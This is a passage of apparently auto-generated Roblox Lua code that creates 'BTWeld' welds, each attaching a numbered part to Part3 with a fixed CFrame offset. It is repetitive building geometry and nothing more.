Weld36.C1 = CFrame.new(-0.00166904926, -3.09995842, -0.665301085, -1, -2.32830644e-10, 6.22057996e-08, -1.16415322e-10, -1.00000024, -6.14672899e-08, 6.45686669e-08, -5.77419996e-08, 1.00000024)
Weld36.Part0 = Part3
Weld36.Part1 = Part243
Weld36.part1 = Part243
Weld37.Name = "BTWeld"
Weld37.Parent = Part3
Weld37.C1 = CFrame.new(-1.3257277, -0.0312492847, 5.10531425, 9.66574589e-08, 0.0174533594, 0.999847949, -1, 2.08499841e-07, 9.1315087e-08, -2.07335688e-07, -0.999847949, 0.0174533576)
Weld37.Part0 = Part3
Weld37.Part1 = Part191
Weld37.part1 = Part191
Weld38.Name = "BTWeld"
Weld38.Parent = Part3
Weld38.C1 = CFrame.new(2.98023224e-06, -0.520121574, 0.565322638, -1, 2.08499841e-07, -1.4426405e-08, 1.87777914e-07, 0.923879921, 0.382683069, 9.12114047e-08, 0.382683039, -0.923879921)
Weld38.Part0 = Part3
Weld38.Part1 = Part459
Weld38.part1 = Part459
Weld39.Name = "BTWeld"
Weld39.Parent = Part3
Weld39.C1 = CFrame.new(-2.44379044e-06, 1.62276363, -0.980819702, 1, -3.87430191e-07, 3.99177225e-08, -1.89582352e-07, -0.569997728, -0.821646571, 3.3993274e-07, 0.821646512, -0.569997668)
Weld39.Part0 = Part3
Weld39.Part1 = Part327
Weld39.part1 = Part327
Weld40.Name = "BTWeld"
Weld40.Parent = Part3
Weld40.C1 = CFrame.new(3.69548798e-06, -1.7807188, -0.638116598, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld40.Part0 = Part3
Weld40.Part1 = Part229
Weld40.part1 = Part229
Weld41.Name = "BTWeld"
Weld41.Parent = Part3
Weld41.C1 = CFrame.new(-2.98023224e-06, -0.170754433, -0.381493092, 1, 2.32830644e-10, 1.14778231e-09, 2.32830644e-10, 1.00000024, 1.86264515e-09, 1.14778231e-09, 1.86264515e-09, 1.00000024)
Weld41.Part0 = Part3
Weld41.Part1 = Part469
Weld41.part1 = Part469
Weld42.Name = "BTWeld"
Weld42.Parent = Part3
Weld42.C1 = CFrame.new(1.7285347e-06, -0.568753242, -0.743589878, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld42.Part0 = Part3
Weld42.Part1 = Part169
Weld42.part1 = Part169
Weld43.Name = "BTWeld"
Weld43.Parent = Part3
Weld43.C1 = CFrame.new(1.84774399e-06, -0.227245331, -0.390619993, -1, 1.18976459e-07, 3.56074452e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.58400939e-07, -5.77419996e-08, 1.00000024)
Weld43.Part0 = Part3
Weld43.Part1 = Part463
Weld43.part1 = Part463
Weld44.Name = "BTWeld"
Weld44.Parent = Part3
Weld44.C1 = CFrame.new(-1.84774399e-06, 0.916108131, -0.790865183, 1, -5.93718141e-08, 2.56368367e-08, 5.97210601e-08, 1.00000024, 5.96046448e-08, -2.29756552e-08, -5.77419996e-08, 1.00000024)
Weld44.Part0 = Part3
Weld44.Part1 = Part411
Weld44.part1 = Part411
Weld45.Name = "BTWeld"
Weld45.Parent = Part3
Weld45.C1 = CFrame.new(3.75509262e-06, -2.08321857, -0.731868029, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld45.Part0 = Part3
Weld45.Part1 = Part475
Weld45.part1 = Part475
Weld46.Name = "BTWeld"
Weld46.Parent = Part3
Weld46.C1 = CFrame.new(0.00166875124, 3.12339592, -0.606613398, 1, -1.18976459e-07, -6.2136678e-08, 1.1944212e-07, 1.00000024, -8.94069672e-08, 6.48051355e-08, 9.12696123e-08, 1.00000024)
Weld46.Part0 = Part3
Weld46.Part1 = Part473
Weld46.part1 = Part473
Weld47.Name = "BTWeld"
Weld47.Parent = Part3
Weld47.C1 = CFrame.new(-0.246384621, -0.03125, 0.315700531, 8.35862011e-08, -0.965926051, 0.258819014, 1, 6.17001206e-08, -9.08512447e-08, 7.39237294e-08, 0.258818984, 0.965926111)
Weld47.Part0 = Part3
Weld47.Part1 = Part355
Weld47.part1 = Part355
Weld48.Name = "BTWeld"
Weld48.Parent = Part3
Weld48.C1 = CFrame.new(2.74181366e-06, 0.908480644, 0.621105194, -1, 3.87430191e-07, -2.68737494e-08, -1.25437509e-07, -0.382683992, -0.923879504, -3.67756002e-07, -0.923879564, 0.382684022)
Weld48.Part0 = Part3
Weld48.Part1 = Part341
Weld48.part1 = Part341
Weld49.Name = "BTWeld"
Weld49.Parent = Part3
Weld49.C1 = CFrame.new(1.96695328e-06, -0.43809557, 0.254676819, -1, 2.08499841e-07, 8.61909939e-08, -8.48667696e-08, -0.707106531, 0.707107365, 2.10478902e-07, 0.707107365, 0.707106471)
Weld49.Part0 = Part3
Weld49.Part1 = Part269
Weld49.part1 = Part269
Weld50.Name = "BTWeld"
Weld50.Parent = Part3
Weld50.C1 = CFrame.new(1.32572746, -0.0312505364, 5.10531616, -1.84201781e-07, -0.0174533594, -0.999847949, 1, -2.08499841e-07, -1.78890332e-07, -2.05705874e-07, -0.999847949, 0.0174533576)
Weld50.Part0 = Part3
Weld50.Part1 = Part379
Weld50.part1 = Part379
Weld51.Name = "BTWeld"
Weld51.Parent = Part3
Weld51.C1 = CFrame.new(1.7285347e-06, -0.242359161, -0.146375895, -1, 2.08499841e-07, 2.3712164e-07, -2.08849087e-07, -1.00000024, 0, 2.39566361e-07, 1.86264515e-09, 1.00000024)
Weld51.Part0 = Part3
Weld51.Part1 = Part455
Weld51.part1 = Part455
Weld52.Name = "BTWeld"
Weld52.Parent = Part3
Weld52.C1 = CFrame.new(-3.03983688e-06, -0.143110275, -0.641388893, 1, 8.95233825e-08, 7.0387614e-08, -6.88014552e-08, 0.96592617, -0.258818775, -8.91450327e-08, 0.258818746, 0.96592623)
Weld52.Part0 = Part3
Weld52.Part1 = Part453
Weld52.part1 = Part453
Weld53.Name = "BTWeld"
Weld53.Parent = Part3
Weld53.C1 = CFrame.new(1.84774399e-06, -0.316618919, -0.362743855, -1, 1.18976459e-07, 3.56074452e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.58400939e-07, -5.77419996e-08, 1.00000024)
Weld53.Part0 = Part3
Weld53.Part1 = Part425
Weld53.part1 = Part425
Weld54.Name = "BTWeld"
Weld54.Parent = Part3
Weld54.C1 = CFrame.new(-2.44379044e-06, 3.96811485, 0.642149091, 1, -2.08499841e-07, 1.92838343e-07, -1.85798854e-07, -0.993572116, -0.113202929, 2.13360181e-07, 0.113202937, -0.993572235)
Weld54.Part0 = Part3
Weld54.Part1 = Part241
Weld54.part1 = Part241
Weld55.Name = "BTWeld"
Weld55.Parent = Part3
Weld55.C1 = CFrame.new(-2.08616257e-06, 0.207164764, -0.535107613, 1, 2.08732672e-07, 7.35781214e-08, -2.08383426e-07, 1.00000024, 1.78813934e-07, -7.12225301e-08, -1.76951289e-07, 1.00000024)
Weld55.Part0 = Part3
Weld55.Part1 = Part321
Weld55.part1 = Part321
Weld56.Name = "BTWeld"
Weld56.Parent = Part3
Weld56.C1 = CFrame.new(0.3903265, -0.0312507153, 0.188101292, -2.43075192e-07, -0.866025627, -0.5, 1, -2.29571015e-07, -8.65911716e-08, -3.80096026e-08, -0.49999994, 0.866025686)
Weld56.Part0 = Part3
Weld56.Part1 = Part449
Weld56.part1 = Part449
Weld57.Name = "BTWeld"
Weld57.Parent = Part3
Weld57.C1 = CFrame.new(4.0832634, -0.0312500596, 2.68361759, -3.40398401e-07, -0.719340265, -0.694658279, 1, -3.15834768e-07, -1.60429408e-07, -1.03143975e-07, -0.694658279, 0.719340265)
Weld57.Part0 = Part3
Weld57.Part1 = Part261
Weld57.part1 = Part261
Weld58.Name = "BTWeld"
Weld58.Parent = Part3
Weld58.C1 = CFrame.new(3.87430191e-06, -2.97136497, -1.32431102, -1, 1.19092874e-07, 2.00954673e-07, -1.67870894e-07, -0.965925992, -0.258819073, 1.64814992e-07, -0.258819073, 0.965926111)
Weld58.Part0 = Part3
Weld58.Part1 = Part367
Weld58.part1 = Part367
Weld59.Name = "BTWeld"
Weld59.Parent = Part3
Weld59.C1 = CFrame.new(-3.21865082e-06, -0.0555143356, 0.74919796, 1, 2.08732672e-07, 1.05254003e-07, 7.4505806e-08, -0.707106292, 0.707107484, 2.20257789e-07, -0.707107544, -0.707106352)
Weld59.Part0 = Part3
Weld59.Part1 = Part179
Weld59.part1 = Part179
Weld60.Name = "BTWeld"
Weld60.Parent = Part3
Weld60.C1 = CFrame.new(0.854812145, -0.0312569141, 0.683163643, -7.71833584e-08, 0.707106531, -0.707107306, 1, 1.8987339e-07, 8.20728019e-08, 1.90921128e-07, -0.707107365, -0.707106531)
Weld60.Part0 = Part3
Weld60.Part1 = Part437
Weld60.part1 = Part437
Weld61.Name = "BTWeld"
Weld61.Parent = Part3
Weld61.C1 = CFrame.new(1.84774399e-06, -0.363491058, -0.331495762, -1, 1.18976459e-07, 3.56074452e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.58400939e-07, -5.77419996e-08, 1.00000024)
Weld61.Part0 = Part3
Weld61.Part1 = Part365
Weld61.part1 = Part365
Weld62.Name = "BTWeld"
Weld62.Parent = Part3
Weld62.C1 = CFrame.new(-5.96046448e-08, -0.251069069, 0.0857863426, -1, 2.08499841e-07, 1.84947567e-07, -1.53202564e-07, -0.965926051, 0.258819163, 2.35246262e-07, 0.258819163, 0.96592617)
Weld62.Part0 = Part3
Weld62.Part1 = Part423
Weld62.part1 = Part423
Weld63.Name = "BTWeld"
Weld63.Parent = Part3
Weld63.C1 = CFrame.new(2.92062759e-06, 0.530877113, 0.384551048, -1, -2.32830644e-10, 1.16708179e-07, -1.19271135e-07, -1.01514161e-06, -1.00000024, -1.16415322e-10, -1.00000024, 1.01141632e-06)
Weld63.Part0 = Part3
Weld63.Part1 = Part421
Weld63.part1 = Part421
Weld64.Name = "BTWeld"
Weld64.Parent = Part3
Weld64.C1 = CFrame.new(3.81469727e-06, -1.63659573, -0.658368826, -1, 2.08499841e-07, 1.81222276e-07, -2.08849087e-07, -1.00000024, 0, 1.83687007e-07, 1.86264515e-09, 1.00000024)
Weld64.Part0 = Part3
Weld64.Part1 = Part391
Weld64.part1 = Part391
Weld65.Name = "BTWeld"
Weld65.Parent = Part3
Weld65.C1 = CFrame.new(3.93390656e-06, -2.9557457, -1.37312269, -1, 1.19092874e-07, 2.00954673e-07, -1.67870894e-07, -0.965925992, -0.258819073, 1.64814992e-07, -0.258819073, 0.965926111)
Weld65.Part0 = Part3
Weld65.Part1 = Part419
Weld65.part1 = Part419
Weld66.Name = "BTWeld"
Weld66.Parent = Part3
Weld66.C1 = CFrame.new(-2.98023224e-07, 3.86712265, 0.467648745, 1, -2.08499841e-07, 1.92838343e-07, -1.85798854e-07, -0.993572116, -0.113202929, 2.13360181e-07, 0.113202937, -0.993572235)
Weld66.Part0 = Part3
Weld66.Part1 = Part415
Weld66.part1 = Part415
Weld67.Name = "BTWeld"
Weld67.Parent = Part3
Weld67.C1 = CFrame.new(-2.02655792e-06, 0.114692688, -0.875624657, 1, 2.08732672e-07, 7.35781214e-08, -2.19908543e-07, 0.965926111, 0.258818954, -1.55705493e-08, -0.258818954, 0.96592617)
Weld67.Part0 = Part3
Weld67.Part1 = Part193
Weld67.part1 = Part193
Weld68.Name = "BTWeld"
Weld68.Parent = Part3
Weld68.C1 = CFrame.new(1.84774399e-06, -0.820864677, -0.453119278, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld68.Part0 = Part3
Weld68.Part1 = Part447
Weld68.part1 = Part447
Weld69.Name = "BTWeld"
Weld69.Parent = Part3
Weld69.C1 = CFrame.new(1.84774399e-06, -0.879114151, -0.453119278, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld69.Part0 = Part3
Weld69.Part1 = Part329
Weld69.part1 = Part329
Weld70.Name = "BTWeld"
Weld70.Parent = Part3
Weld70.C1 = CFrame.new(-3.09944153e-06, 2.06479263, 0.744927168, 1, -1.19092874e-07, 2.05247488e-07, -1.07684173e-07, -0.998391926, -0.0566923842, 2.10064172e-07, 0.0566923767, -0.998391867)
Weld70.Part0 = Part3
Weld70.Part1 = Part213
Weld70.part1 = Part213
Weld71.Name = "BTWeld"
Weld71.Parent = Part3
Weld71.C1 = CFrame.new(-4.0832634, -0.0312493443, 2.68361759, 2.50991434e-07, 0.719340265, 0.694658279, -1, 2.34693289e-07, 1.15569492e-07, -7.84639269e-08, -0.694658279, 0.719340265)
Weld71.Part0 = Part3
Weld71.Part1 = Part257
Weld71.part1 = Part257
Weld72.Name = "BTWeld"
Weld72.Parent = Part3
Weld72.C1 = CFrame.new(1.84774399e-06, -0.227245331, -0.390619993, -1, 1.18976459e-07, 3.56074452e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.58400939e-07, -5.77419996e-08, 1.00000024)
Weld72.Part0 = Part3
Weld72.Part1 = Part173
Weld72.part1 = Part173
Weld73.Name = "BTWeld"
Weld73.Parent = Part3
Weld73.C1 = CFrame.new(2.86102295e-06, 0.835924149, -0.142241955, -1, 3.27709131e-07, -1.37008101e-07, -1.36438757e-07, -0.707107067, -0.707106829, -3.27592716e-07, -0.707106769, 0.707107008)
Weld73.Part0 = Part3
Weld73.Part1 = Part361
Weld73.part1 = Part361
Weld74.Name = "BTWeld"
Weld74.Parent = Part3
Weld74.C1 = CFrame.new(-0.00166893005, 2.82995987, 0.726299524, -1, 1.18976459e-07, 1.49711923e-07, 1.1944212e-07, 1.00000024, 0, -1.52022039e-07, -1.86264515e-09, -1.00000024)
Weld74.Part0 = Part3
Weld74.Part1 = Part377
Weld74.part1 = Part377
Weld75.Name = "BTWeld"
Weld75.Parent = Part3
Weld75.C1 = CFrame.new(1.7285347e-06, 0.0122146606, -1.26963711, -1, -2.32830644e-10, 3.04902642e-07, -2.17230991e-07, -0.707107246, -0.70710665, 2.16532499e-07, -0.70710665, 0.707107186)
Weld75.Part0 = Part3
Weld75.Part1 = Part283
Weld75.part1 = Part283
Weld76.Name = "BTWeld"
Weld76.Parent = Part3
Weld76.C1 = CFrame.new(-2.86102295e-06, -0.724999189, 0.384550095, 1, -1.19092874e-07, -4.21059667e-08, 4.47653292e-08, 1.01514161e-06, 1.00000024, -1.19325705e-07, -1.00000024, 1.01327896e-06)
Weld76.Part0 = Part3
Weld76.Part1 = Part291
Weld76.part1 = Part291
Weld77.Name = "BTWeld"
Weld77.Parent = Part3
Weld77.C1 = CFrame.new(-8.94069672e-07, 4.09370422, 0.476376891, 1, -5.93718141e-08, 2.00789145e-07, -3.6903657e-08, -0.993572116, -0.113202639, 2.04046955e-07, 0.113202639, -0.993572235)
Weld77.Part0 = Part3
Weld77.Part1 = Part395
Weld77.part1 = Part395
Weld78.Name = "BTWeld"
Weld78.Parent = Part3
Weld78.C1 = CFrame.new(2.92062759e-06, -0.468894958, 0.574460983, -1, 2.08499841e-07, -3.86498868e-08, 1.92318112e-07, 0.965926051, 0.258818746, 8.94651748e-08, 0.258818746, -0.965926111)
Weld78.Part0 = Part3
Weld78.Part1 = Part451
Weld78.part1 = Part451
Weld79.Name = "BTWeld"
Weld79.Parent = Part3
Weld79.C1 = CFrame.new(1.90734863e-06, 0.962981224, 0.66424036, -1, 5.93718141e-08, 6.19384082e-08, 5.98374754e-08, 1.00000024, -8.94069672e-08, -6.48051355e-08, -9.12696123e-08, -1.00000024)
Weld79.Part0 = Part3
Weld79.Part1 = Part203
Weld79.part1 = Part203
Weld80.Name = "BTWeld"
Weld80.Parent = Part3
Weld80.C1 = CFrame.new(-1.93451118, -0.0312488079, -0.270594597, 1.53435394e-07, 0.998629808, 0.0523359701, -1, 1.53202564e-07, 4.08908818e-09, -2.91402102e-09, -0.0523359627, 0.998629689)
Weld80.Part0 = Part3
Weld80.Part1 = Part397
Weld80.part1 = Part397
Weld81.Name = "BTWeld"
Weld81.Parent = Part3
Weld81.C1 = CFrame.new(-1.90734863e-06, 0.382622719, -0.453119993, 1, 2.32830644e-10, 1.14778231e-09, 2.32830644e-10, 1.00000024, 1.86264515e-09, 1.14778231e-09, 1.86264515e-09, 1.00000024)
Weld81.Part0 = Part3
Weld81.Part1 = Part237
Weld81.part1 = Part237
Weld82.Name = "BTWeld"
Weld82.Parent = Part3
Weld82.C1 = CFrame.new(-1.90734863e-06, 1.7890873, 3.13711452, 1, 2.68220901e-07, 1.37593815e-07, 9.1502443e-08, -0.700908601, 0.713251352, 2.86381692e-07, -0.713251412, -0.700908601)
Weld82.Part0 = Part3
Weld82.Part1 = Part373
Weld82.part1 = Part373
Weld83.Name = "BTWeld"
Weld83.Parent = Part3
Weld83.C1 = CFrame.new(-3.57627869e-06, 1.17321014, 0.911328077, 1, -1.19092874e-07, 2.04781827e-07, -1.19325705e-07, -1.00000024, 2.68220901e-07, 2.03222953e-07, -2.68220901e-07, -1.00000024)
Weld83.Part0 = Part3
Weld83.Part1 = Part163
Weld83.part1 = Part163
Weld84.Name = "BTWeld"
Weld84.Parent = Part3
Weld84.C1 = CFrame.new(1.7285347e-06, -0.568753242, -0.743589878, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld84.Part0 = Part3
Weld84.Part1 = Part281
Weld84.part1 = Part281
Weld85.Name = "BTWeld"
Weld85.Parent = Part3
Weld85.C1 = CFrame.new(-4.17232513e-07, 4.000597, -2.49560165, 1, -3.27709131e-07, 1.59834599e-07, -1.16531737e-07, -0.700910211, -0.713249803, 3.44938599e-07, 0.713249862, -0.700910151)
Weld85.Part0 = Part3
Weld85.Part1 = Part345
Weld85.part1 = Part345
Weld86.Name = "BTWeld"
Weld86.Parent = Part3
Weld86.C1 = CFrame.new(1.78813934e-06, -0.568753242, -1.01896238, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld86.Part0 = Part3
Weld86.Part1 = Part399
Weld86.part1 = Part399
Weld87.Name = "BTWeld"
Weld87.Parent = Part3
Weld87.C1 = CFrame.new(3.69548798e-06, -2.28520775, -0.633616686, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld87.Part0 = Part3
Weld87.Part1 = Part199
Weld87.part1 = Part199
Weld88.Name = "BTWeld"
Weld88.Parent = Part3
Weld88.C1 = CFrame.new(1.78813934e-06, -0.829603195, -0.33899641, -1, 2.08499841e-07, 1.81222276e-07, -2.08849087e-07, -1.00000024, 0, 1.83687007e-07, 1.86264515e-09, 1.00000024)
Weld88.Part0 = Part3
Weld88.Part1 = Part219
Weld88.part1 = Part219
Weld89.Name = "BTWeld"
Weld89.Parent = Part3
Weld89.C1 = CFrame.new(-3.33786011e-06, -0.0132074356, 0.994934082, 1, 2.32830644e-10, 2.04248863e-07, -5.65778464e-08, -0.960049927, 0.279829443, 1.94384484e-07, -0.279829443, -0.960049987)
Weld89.Part0 = Part3
Weld89.Part1 = Part1
Weld89.part1 = Part1
Weld90.Name = "BTWeld"
Weld90.Parent = Part3
Weld90.C1 = CFrame.new(1.96695328e-06, 0.916108131, 0.907114267, -1, 5.93718141e-08, 6.19384082e-08, 5.98374754e-08, 1.00000024, -8.94069672e-08, -6.48051355e-08, -9.12696123e-08, -1.00000024)
Weld90.Part0 = Part3
Weld90.Part1 = Part275
Weld90.part1 = Part275
Weld91.Name = "BTWeld"
Weld91.Parent = Part3
Weld91.C1 = CFrame.new(-1.7285347e-06, -1.12285709, 0.789239883, 1, 2.32830644e-10, -1.49781044e-07, -1.16415322e-10, -1.00000024, -6.14672899e-08, -1.52112989e-07, 5.77419996e-08, -1.00000024)
Weld91.Part0 = Part3
Weld91.Part1 = Part233
Weld91.part1 = Part233
Weld92.Name = "BTWeld"
Weld92.Parent = Part3
Weld92.C1 = CFrame.new(3.03983688e-06, 0.303620577, 0.382497787, -1, -2.08732672e-07, 1.17877789e-07, -1.20393452e-07, -1.19395554e-06, -1.00000024, 2.08499841e-07, -1.00000024, 1.1920929e-06)
Weld92.Part0 = Part3
Weld92.Part1 = Part221
Weld92.part1 = Part221
Weld93.Name = "BTWeld"
Weld93.Parent = Part3
Weld93.C1 = CFrame.new(-0.522247314, -0.0312470198, 0.449783325, -2.65327981e-06, 0.500000775, 0.866025329, -1, -2.96032522e-06, -1.35692608e-06, 1.88592821e-06, -0.866025269, 0.500000715)
Weld93.Part0 = Part3
Weld93.Part1 = Part467
Weld93.part1 = Part467
Weld94.Name = "BTWeld"
Weld94.Parent = Part3
Weld94.C1 = CFrame.new(-3.4570694e-06, 1.39806747, 0.593937159, 1, -1.19092874e-07, 2.05247488e-07, -1.07684173e-07, -0.998391926, -0.0566924736, 2.09929567e-07, 0.0566924661, -0.998391867)
Weld94.Part0 = Part3
Weld94.Part1 = Part339
Weld94.part1 = Part339
Weld95.Name = "BTWeld"
Weld95.Parent = Part3
Weld95.C1 = CFrame.new(0.795685768, -0.0312509537, -0.711493969, -8.45175236e-08, -0.932008028, 0.362438083, 1, -8.89413059e-08, 5.51335688e-09, 2.98023224e-08, 0.362438083, 0.932008028)
Weld95.Part0 = Part3
Weld95.Part1 = Part401
Weld95.part1 = Part401
Weld96.Name = "BTWeld"
Weld96.Parent = Part3
Weld96.C1 = CFrame.new(3.93390656e-06, -1.17022419, -0.44987011, -1, 2.08499841e-07, 1.81222276e-07, -2.08849087e-07, -1.00000024, 0, 1.83687007e-07, 1.86264515e-09, 1.00000024)
Weld96.Part0 = Part3
Weld96.Part1 = Part409
Weld96.part1 = Part409
Weld97.Name = "BTWeld"
Weld97.Parent = Part3
Weld97.C1 = CFrame.new(-2.92062759e-06, 2.3621769, 0.817341089, 1, -1.19092874e-07, 1.99657734e-07, -1.07917003e-07, -0.998391926, -0.0566924736, 2.04341632e-07, 0.0566924661, -0.998391867)
Weld97.Part0 = Part3
Weld97.Part1 = Part381
Weld97.part1 = Part381
Weld98.Name = "BTWeld"
Weld98.Parent = Part3
Weld98.C1 = CFrame.new(-0.431774139, -0.0312498212, 0.503154755, 7.72997737e-08, -0.70710665, 0.707107186, 1, 2.03726813e-08, -8.74406396e-08, 4.88944352e-08, 0.707107186, 0.70710665)
Weld98.Part0 = Part3
Weld98.Part1 = Part431
Weld98.part1 = Part431
Weld99.Name = "BTWeld"
Weld99.Parent = Part3
Weld99.C1 = CFrame.new(-3.15904617e-06, 0.420814514, 0.987199306, 1, -1.18976459e-07, 2.12703526e-07, -1.42492354e-07, -0.993572056, 0.1132036, 1.96479959e-07, -0.113203593, -0.993572116)
Weld99.Part0 = Part3
Weld99.Part1 = Part215
Weld99.part1 = Part215
Weld100.Name = "BTWeld"
Weld100.Parent = Part3
Weld100.C1 = CFrame.new(1.66893005e-06, -0.394741058, -0.312496424, -1, 1.18976459e-07, 3.56074452e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.58400939e-07, -5.77419996e-08, 1.00000024)
Weld100.Part0 = Part3
Weld100.Part1 = Part231
Weld100.part1 = Part231
Weld101.Name = "BTWeld"
Weld101.Parent = Part3
Weld101.C1 = CFrame.new(0.431774139, -0.0312502384, 0.503154755, 1.21071935e-08, 0.70710665, -0.707107186, -1, 2.66591087e-08, 8.21273716e-09, 2.63098627e-08, 0.707107186, 0.70710665)
Weld101.Part0 = Part3
Weld101.Part1 = Part195
Weld101.part1 = Part195
Weld102.Name = "BTWeld"
Weld102.Parent = Part3
Weld102.C1 = CFrame.new(-2.98023224e-06, 0.52676487, 0.681500196, 1, -1.18976459e-07, 2.07579433e-07, -1.19325705e-07, -1.00000024, 3.57627869e-07, 2.05687684e-07, -3.57627869e-07, -1.00000024)
Weld102.Part0 = Part3
Weld102.Part1 = Part247
Weld102.part1 = Part247
Weld103.Name = "BTWeld"
Weld103.Parent = Part3
Weld103.C1 = CFrame.new(-3.33786011e-06, -0.982596397, -1.40651131, 1, 2.08732672e-07, -4.8930815e-10, -1.93249434e-07, 0.922201157, -0.386711091, -7.82310963e-08, 0.386711091, 0.922201216)
Weld103.Part0 = Part3
Weld103.Part1 = Part307
Weld103.part1 = Part307
Weld104.Name = "BTWeld"
Weld104.Parent = Part3
Weld104.C1 = CFrame.new(-0.0437107086, -0.0312517285, 1.4942646, 1.91503204e-07, 0.707107306, 0.70710659, 1, 2.29338184e-08, -2.9189323e-07, -2.23633833e-07, 0.707106531, -0.707107246)
Weld104.Part0 = Part3
Weld104.Part1 = Part259
Weld104.part1 = Part259
Weld105.Name = "BTWeld"
Weld105.Parent = Part3
Weld105.C1 = CFrame.new(3.87430191e-06, -3.31824732, 1.47011757, -1, 2.08499841e-07, 7.08205334e-08, -1.35507435e-07, -0.838670611, 0.544639409, 1.75263267e-07, 0.544639468, 0.838670611)
Weld105.Part0 = Part3
Weld105.Part1 = Part407
Weld105.part1 = Part407
Weld106.Name = "BTWeld"
Weld106.Parent = Part3
Weld106.C1 = CFrame.new(-0.795685768, -0.0312490463, -0.711493969, -4.88944352e-09, 0.932008028, -0.362438083, -1, 1.22236088e-08, 4.33428795e-08, 4.74974513e-08, 0.362438083, 0.932008028)
Weld106.Part0 = Part3
Weld106.Part1 = Part263
Weld106.part1 = Part263
Weld107.Name = "BTWeld"
Weld107.Parent = Part3
Weld107.C1 = CFrame.new(-3.69548798e-06, -3.00638485, 1.33266807, 1, -1.18976459e-07, -3.95668394e-07, -1.86846592e-07, -0.984807968, -0.173648164, -3.70942871e-07, 0.173648179, -0.984807909)
Weld107.Part0 = Part3
Weld107.Part1 = Part351
Weld107.part1 = Part351
Weld108.Name = "BTWeld"
Weld108.Parent = Part3
Weld108.C1 = CFrame.new(3.63588333e-06, -0.320664406, -1.40051842, -1, -2.32830644e-10, 3.04902642e-07, -2.17230991e-07, -0.707107246, -0.70710665, 2.16532499e-07, -0.70710665, 0.707107186)
Weld108.Part0 = Part3
Weld108.Part1 = Part331
Weld108.part1 = Part331
Weld109.Name = "BTWeld"
Weld109.Parent = Part3
Weld109.C1 = CFrame.new(4.17232513e-07, 0.449201822, 1.99047565, -1, 4.76720743e-07, 8.52196536e-08, -6.01830834e-08, 0.0566915721, -0.998391926, -4.81144525e-07, -0.998391926, -0.0566915721)
Weld109.Part0 = Part3
Weld109.Part1 = Part187
Weld109.part1 = Part187
Weld110.Name = "BTWeld"
Weld110.Parent = Part3
Weld110.C1 = CFrame.new(-2.86102295e-06, 2.36217117, 0.642843485, 1, -1.19092874e-07, 1.99657734e-07, -1.07800588e-07, -0.998391807, -0.0566924661, 2.0434527e-07, 0.0566924587, -0.998391867)
Weld110.Part0 = Part3
Weld110.Part1 = Part239
Weld110.part1 = Part239
Weld111.Name = "BTWeld"
Weld111.Parent = Part3
Weld111.C1 = CFrame.new(-3.64600945, -0.0312488079, -0.13107121, 1.57626346e-07, 0.994522154, 0.104528487, -1, 1.56695023e-07, 1.25419319e-08, -2.27009878e-09, -0.104528494, 0.994522214)
Weld111.Part0 = Part3
Weld111.Part1 = Part293
Weld111.part1 = Part293
Weld112.Name = "BTWeld"
Weld112.Parent = Part3
Weld112.C1 = CFrame.new(-1.84774399e-06, -0.363490105, 0.43412137, 1, -1.19092874e-07, -2.68964868e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, -2.71322278e-07, 5.77419996e-08, -1.00000024)
Weld112.Part0 = Part3
Weld112.Part1 = Part387
Weld112.part1 = Part387
Weld113.Name = "BTWeld"
Weld113.Parent = Part3
Weld113.C1 = CFrame.new(1.7285347e-06, -0.568753242, -0.743589878, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld113.Part0 = Part3
Weld113.Part1 = Part471
Weld113.part1 = Part471
Weld114.Name = "BTWeld"
Weld114.Parent = Part3
Weld114.C1 = CFrame.new(5.96046448e-08, 0.289498925, 3.66633129, -1, 4.76720743e-07, 1.08511813e-07, -5.57629392e-08, 0.113202013, -0.993572295, -4.86383215e-07, -0.993572235, -0.113202013)
Weld114.Part0 = Part3
Weld114.Part1 = Part301
Weld114.part1 = Part301
Weld115.Name = "BTWeld"
Weld115.Parent = Part3
Weld115.C1 = CFrame.new(3.75509262e-06, -2.22058773, -0.638116837, -1, 2.08499841e-07, 1.81222276e-07, -2.08849087e-07, -1.00000024, 0, 1.83687007e-07, 1.86264515e-09, 1.00000024)
Weld115.Part0 = Part3
Weld115.Part1 = Part389
Weld115.part1 = Part389
Weld116.Name = "BTWeld"
Weld116.Parent = Part3
Weld116.C1 = CFrame.new(-3.03983688e-06, 0.552669525, 1.01939201, 1, 2.32830644e-10, 1.78628397e-07, -6.84522092e-08, -0.922201097, 0.386711597, 1.62399374e-07, -0.386711597, -0.922201097)
Weld116.Part0 = Part3
Weld116.Part1 = Part255
Weld116.part1 = Part255
Weld117.Name = "BTWeld"
Weld117.Parent = Part3
Weld117.C1 = CFrame.new(-3.75509262e-06, -3.10320187, 0.522767544, 1, -1.19092874e-07, -3.84490704e-07, -8.49831849e-08, -0.996194959, 0.0871557072, -3.95724783e-07, -0.0871557146, -0.996194959)
Weld117.Part0 = Part3
Weld117.Part1 = Part299
